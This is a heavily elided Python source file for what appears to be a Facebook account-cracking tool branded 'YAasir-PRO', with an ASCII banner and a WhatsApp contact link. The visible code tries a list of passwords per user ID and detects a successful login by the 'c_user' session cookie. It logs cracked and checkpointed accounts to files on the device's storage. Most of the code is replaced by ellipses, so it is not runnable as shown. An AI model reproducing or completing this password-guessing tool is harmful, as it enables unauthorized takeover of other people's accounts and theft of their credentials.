...
db    db  .d8b.  .d8888. d888888b d8888b. 

`8b  d8' d8' `8b 88'  YP   `88'   88  `8D 

 `8bd8'  88ooo88 `8bo.      88    88oobY' 

   88    88~~~88   `Y8b.    88    88`8b   

   88    88   88 db   8D   .88.   88 `88. 

   YP    YP   YP `8888Y' Y888888P 88   YD 
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    input("\x1b[1;97mPress enter to back YAasir-PRO Tools")
...
def R():
			...
			print ("\033[1m [!] Tool    : POWER-PRO")

 

			print (" [!] Brand   : Y4SIR_X_MARW4N")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[YAasir]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    open('/sdcard/YAasir_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/YAasir_CP.txt' , 'a').write('%s\n' % wrt)
...
def dupcutter():
	...
	os.system("xdg-open https://wa.me/+923189141630")
